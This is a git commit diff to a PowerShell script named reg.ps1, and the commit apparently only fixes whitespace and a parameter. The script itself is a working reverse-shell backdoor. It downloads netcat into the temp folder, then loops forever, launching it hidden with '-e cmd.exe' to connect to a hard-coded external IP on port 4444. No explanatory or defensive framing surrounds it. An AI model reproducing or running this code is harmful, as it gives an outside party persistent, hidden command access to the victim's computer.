0be073c59679498a48aef26dfae1e7e5d70c6213
Oladipo Isaac <oladipoolayinka421@gmail.com>
2025-09-05 12:26:49 +0100

    Update reg.ps1

--- reg.ps1
+++ reg.ps1
@@ -1,9 +1,9 @@
-$listenerIP = '65.52.209.243'  
+$listenerIP = '65.52.209.243'
 $port = 4444 
 $ncUrl = 'https://github.com/int0x33/nc.exe/raw/master/nc64.exe'
 $ncPath = "$env:TEMP\nc.exe" 
 If (-Not (Test-Path $ncPath)) {
-    Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing -WindowStyle Hidden
+    Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing
 }
 while ($true) {
         Start-Process $ncPath -ArgumentList "$listenerIP $port -e cmd.exe" -WindowStyle Hidden
